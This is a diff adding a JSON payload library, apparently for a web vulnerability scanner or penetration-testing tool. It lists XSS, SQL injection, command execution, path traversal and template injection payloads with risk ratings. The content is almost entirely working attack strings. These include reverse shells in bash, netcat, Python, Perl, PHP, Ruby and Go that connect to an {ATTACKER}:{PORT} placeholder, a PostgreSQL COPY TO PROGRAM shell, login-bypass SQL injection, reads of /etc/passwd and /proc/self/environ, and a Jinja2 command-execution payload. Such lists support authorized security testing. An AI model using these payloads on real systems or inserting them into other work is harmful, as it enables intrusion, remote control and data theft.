@@ -1,0 +1,232 @@
+{
+    "xss": [
+        {
+            "name": "Basic Script Alert",
+            "template": "<script>alert(1)</script>",
+            "risk": "High"
+        },
+        {
+            "name": "Image OnError",
+            "template": "<img src=x onerror=alert(1)>",
+            "risk": "Medium"
+        },
+        {
+            "name": "SVG OnLoad",
+            "template": "<svg/onload=alert(1)>",
+            "risk": "Medium"
+        },
+        {
+            "name": "Body OnLoad",
+            "template": "<body onload=alert(1)>",
+            "risk": "Medium"
+        },
+        {
+            "name": "Iframe OnLoad",
+            "template": "<iframe onload=alert(1)></iframe>",
+            "risk": "Medium"
+        },
+        {
+            "name": "Input AutoFocus",
+            "template": "<input onfocus=alert(1) autofocus>",
+            "risk": "Medium"
+        },
+        {
+            "name": "Details Toggle",
+            "template": "<details ontoggle=alert(1)>",
+            "risk": "Low"
+        },
+        {
+            "name": "Object Data",
+            "template": "<object data=javascript:alert(1)>",
+            "risk": "Medium"
+        },
+        {
+            "name": "Anchor Href",
+            "template": "<a href=javascript:alert(1)>Click me</a>",
+            "risk": "Low"
+        },
+        {
+            "name": "Form Action",
+            "template": "<form action=javascript:alert(1)><button>Submit</button></form>",
+            "risk": "Low"
+        },
+        {
+            "name": "Encrypted Payload (Base64)",
+            "template": "<script>eval(atob('YWxlcnQoMSk='))</script>",
+            "risk": "High"
+        },
+        {
+            "name": "Polyglot XSS",
+            "template": "javascript://%250Aalert(1)//\"/*\\'/*/'/*--></script><img/src=x onerror=alert(1)>",
+            "risk": "Critical"
+        },
+        {
+            "name": "AngularJS Template Injection",
+            "template": "{{$on.curry.call().alert(1)}}",
+            "risk": "High"
+        },
+        {
+            "name": "VueJS Template Injection",
+            "template": "{{7*7}}",
+            "risk": "High"
+        },
+        {
+            "name": "React Dangerous Props",
+            "template": "dangerouslySetInnerHTML={{__html: '<img src=x onerror=alert(1)>'}}",
+            "risk": "High"
+        }
+    ],
+    "sqli": [
+        {
+            "name": "Generic OR",
+            "template": "' OR '1'='1",
+            "risk": "High"
+        },
+        {
+            "name": "Generic OR (Double Quote)",
+            "template": "\" OR \"1\"=\"1",
+            "risk": "High"
+        },
+        {
+            "name": "Admin Login Bypass",
+            "template": "admin' --",
+            "risk": "Critical"
+        },
+        {
+            "name": "Admin Login Bypass 2",
+            "template": "admin' #",
+            "risk": "Critical"
+        },
+        {
+            "name": "Time Based (Sleep 5)",
+            "template": "' AND SLEEP(5)--",
+            "risk": "Medium"
+        },
+        {
+            "name": "Union Select NULL",
+            "template": "' UNION SELECT NULL,NULL,NULL--",
+            "risk": "High"
+        },
+        {
+            "name": "Union Select Version",
+            "template": "' UNION SELECT @@version,NULL,NULL--",
+            "risk": "High"
+        },
+        {
+            "name": "Order By Guessing",
+            "template": "' ORDER BY 1--",
+            "risk": "Low"
+        },
+        {
+            "name": "Error Based (UpdateXML)",
+            "template": "' AND UPDATEXML(1,CONCAT(0x3a,(SELECT user())),1)--",
+            "risk": "High"
+        },
+        {
+            "name": "PostgreSQL Shell",
+            "template": "COPY (SELECT '') TO PROGRAM 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ATTACKER} {PORT} >/tmp/f'",
+            "risk": "Critical"
+        }
+    ],
+    "rce": [
+        {
+            "name": "Bash Reverse Shell",
+            "template": "bash -i >& /dev/tcp/{ATTACKER}/{PORT} 0>&1",
+            "risk": "Critical"
+        },
+        {
+            "name": "Netcat Reverse Shell",
+            "template": "nc -e /bin/sh {ATTACKER} {PORT}",
+            "risk": "Critical"
+        },
+        {
+            "name": "Netcat OpenBSD Rev Shell",
+            "template": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ATTACKER} {PORT} >/tmp/f",
+            "risk": "Critical"
+        },
+        {
+            "name": "Python Reverse Shell",
+            "template": "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ATTACKER}\",{PORT}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
+            "risk": "Critical"
+        },
+        {
+            "name": "Perl Reverse Shell",
+            "template": "perl -e 'use Socket;$i=\"{ATTACKER}\";$p={PORT};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'",
+            "risk": "Critical"
+        },
+        {
+            "name": "PHP Reverse Shell",
+            "template": "php -r '$sock=fsockopen(\"{ATTACKER}\",{PORT});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
+            "risk": "Critical"
+        },
+        {
+            "name": "Ruby Reverse Shell",
+            "template": "ruby -rsocket -e'f=TCPSocket.open(\"{ATTACKER}\",{PORT}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
+            "risk": "Critical"
+        },
+        {
+            "name": "Golang Reverse Shell",
+            "template": "echo 'package main;import\"os/exec\";import\"net\";func main(){c,_:=net.Dial(\"tcp\",\"{ATTACKER}:{PORT}\");cmd:=exec.Command(\"/bin/sh\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/r.go && go run /tmp/r.go &",
+            "risk": "Critical"
+        }
+    ],
+    "lfi": [
+        {
+            "name": "Basic Traversal",
+            "template": "../../../etc/passwd",
+            "risk": "High"
+        },
+        {
+            "name": "Null Byte Infection",
+            "template": "../../../etc/passwd%00",
+            "risk": "High"
+        },
+        {
+            "name": "PHP Filter Base64",
+            "template": "php://filter/read=convert.base64-encode/resource=index.php",
+            "risk": "High"
+        },
+        {
+            "name": "Windows.ini",
+            "template": "..\\..\\..\\windows\\win.ini",
+            "risk": "High"
+        },
+        {
+            "name": "Proc Self Environ",
+            "template": "/proc/self/environ",
+            "risk": "Medium"
+        },
+        {
+            "name": "Double URL Encode",
+            "template": "%252e%252e%252f%252e%252e%252fetc/passwd",
+            "risk": "High"
+        }
+    ],
+    "ssti": [
+        {
+            "name": "Jinja2 (Python)",
+            "template": "{{7*7}}",
+            "risk": "Medium"
+        },
+        {
+            "name": "Jinja2 RCE",
+            "template": "{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}",
+            "risk": "Critical"
+        },
+        {
+            "name": "Java (Thymeleaf)",
+            "template": "${7*7}",
+            "risk": "Medium"
+        },
+        {
+            "name": "Ruby (ERB)",
+            "template": "<%= 7*7 %>",
+            "risk": "Medium"
+        },
+        {
+            "name": "Golang (Text/Template)",
+            "template": "{{ . }}",
+            "risk": "Low"
+        }
+    ]
+}
